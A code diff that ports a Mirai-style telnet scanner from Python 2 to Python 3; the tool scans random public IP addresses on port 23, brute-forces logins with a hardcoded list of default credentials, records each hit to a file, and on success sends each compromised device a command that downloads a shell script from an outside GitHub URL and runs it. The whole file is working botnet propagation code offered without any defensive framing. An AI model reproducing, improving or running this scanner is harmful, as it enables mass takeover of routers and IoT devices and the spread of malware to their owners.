@@ -1,9 +1,10 @@
 import threading
 import sys, os, re, time, socket
 from sys import stdout
+import random
 
 if len(sys.argv) < 3:
-    print "Usage: python "+sys.argv[0]+" <threads> <output file>"
+    print("Usage: python " + sys.argv[0] + " <threads> <output file>")
     sys.exit()
 
 combo = [
@@ -54,30 +55,30 @@ combo = [
     "root:fidel123"
 ]
 
-
 threads = int(sys.argv[1])
 output_file = sys.argv[2]
 
 class router(threading.Thread):
-    def __init__ (self, ip):
+    def __init__(self, ip):
         threading.Thread.__init__(self)
         self.ip = str(ip).rstrip('\n')
+
     def run(self):
         username = ""
         password = ""
         for passwd in combo:
             if ":n/a" in passwd:
-                password=""
+                password = ""
             else:
-                password=passwd.split(":")[1]
+                password = passwd.split(":")[1]
             if "n/a:" in passwd:
-                username=""
+                username = ""
             else:
-                username=passwd.split(":")[0]
+                username = passwd.split(":")[0]
             try:
                 tn = socket.socket()
                 tn.settimeout(8)
-                tn.connect((self.ip,23))
+                tn.connect((self.ip, 23))
             except Exception:
                 tn.close()
                 break
@@ -85,7 +86,7 @@ class router(threading.Thread):
                 hoho = ''
                 hoho += readUntil(tn, "ogin:")
                 if "ogin" in hoho:
-                    tn.send(username + "\n")
+                    tn.send((username + "\n").encode('utf-8'))
                     time.sleep(0.09)
             except Exception:
                 tn.close()
@@ -93,7 +94,7 @@ class router(threading.Thread):
                 hoho = ''
                 hoho += readUntil(tn, "assword:")
                 if "assword" in hoho:
-                    tn.send(password + "\n")
+                    tn.send((password + "\n").encode('utf-8'))
                     time.sleep(0.8)
                 else:
                     pass
@@ -101,18 +102,19 @@ class router(threading.Thread):
                 tn.close()
             try:
                 prompt = ''
-                prompt += tn.recv(40960)
+                prompt += tn.recv(40960).decode('utf-8')
+                success = False
                 if ">" in prompt and "ONT" not in prompt:
                     success = True
-                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
+                elif any(x in prompt for x in ["#", "$", "%", "@"]):
                     success = True              
                 else:
                     tn.close()
-                if success == True:
+                if success:
                     try:
-                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
-                        tn.send("wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh\n")
-                        print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
+                        os.system(f"echo {self.ip}:23 {username}:{password} >> {output_file}")
+                        tn.send("wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh;")
+                        print(f"\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m{username}\033[37m:\033[33m{password}\033[37m:\033[32m{self.ip}\033[37m")
                         tn.close()
                         break
                     except:
@@ -126,29 +128,30 @@ def readUntil(tn, string, timeout=8):
     buf = ''
     start_time = time.time()
     while time.time() - start_time < timeout:
-        buf += tn.recv(1024)
+        buf += tn.recv(1024).decode('utf-8')
         time.sleep(0.01)
-        if string in buf: return buf
+        if string in buf: 
+            return buf
     raise Exception('TIMEOUT!')
 
 def Gen_IP():
     not_valid = [10,127,169,172,192]
-    first = random.randrange(1,256)
+    first = random.randrange(1, 256)
     while first in not_valid:
-        first = random.randrange(1,256)
-    ip = ".".join([str(first),str(random.randrange(1,256)),
-    str(random.randrange(1,256)),str(random.randrange(1,256))])
+        first = random.randrange(1, 256)
+    ip = ".".join([str(first), str(random.randrange(1, 256)),
+                   str(random.randrange(1, 256)), str(random.randrange(1, 256))])
     return ip
 
 def HaxThread():
     while 1:
         try:
-            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(2)
             IP = Gen_IP()
             s.connect((IP, 23))
             s.close()
-            print "\033[32m[\033[31m+\033[32m] FOUND " + IP
+            print("\033[32m[\033[31m+\033[32m] FOUND " + IP)
             thread = router(IP)
             thread.start()
         except:
@@ -156,10 +159,10 @@ def HaxThread():
 
 if __name__ == "__main__":
     threadcount = 0
-    for i in xrange(0,threads):
+    for i in range(threads):
         try:
             threading.Thread(target=HaxThread, args=()).start()
             threadcount += 1
         except:
             pass
-    print "[*] Started " + str(threadcount) + " scanner threads!"
+    print("[*] Started " + str(threadcount) + " scanner threads!")
